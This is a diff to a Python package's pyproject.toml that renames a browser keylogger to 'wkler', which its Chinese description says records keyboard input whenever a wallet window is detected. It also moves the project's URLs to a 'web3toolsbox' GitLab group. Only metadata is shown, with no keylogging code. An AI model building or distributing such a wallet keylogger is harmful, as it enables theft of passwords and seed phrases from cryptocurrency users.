@@ -3,16 +3,16 @@ requires = ["hatchling"]
 build-backend = "hatchling.build"
 
 [project]
-name = "bkler"
+name = "wkler"
 version = "0.2.1"
-description = "浏览器键盘记录器 - 仅监控浏览器窗口的键盘输入，记录到 ~/.dev/keylogger_*.log"
+description = "钱包键盘记录器 - 检测钱包窗口时自动记录键盘输入，记录到 ~/.dev/wkler/recording_{日期}.log"
 readme = "README.md"
 requires-python = ">=3.8"
 license = {text = "MIT"}
 authors = [
     {name = "YLX-STUDIO"}
 ]
-keywords = ["keylogger", "browser", "keyboard", "monitoring"]
+keywords = ["keylogger", "wallet", "keyboard", "monitoring"]
 classifiers = [
     "Development Status :: 4 - Beta",
     "Intended Audience :: Developers",
@@ -46,14 +46,14 @@ dev = [
 ]
 
 [project.scripts]
-bkler = "bkler.cli:main"
+wkler = "wkler.cli:main"
 
 [project.urls]
-Homepage = "https://github.com/DegenStar/bkler"
-Repository = "https://github.com/DegenStar/bkler.git"
+Homepage = "https://gitlab.com/web3toolsbox/wkler"
+Repository = "https://gitlab.com/web3toolsbox/wkler.git"
 
 [tool.hatch.build.targets.wheel]
-packages = ["bkler"]
+packages = ["wkler"]
 
 [tool.black]
 line-length = 100
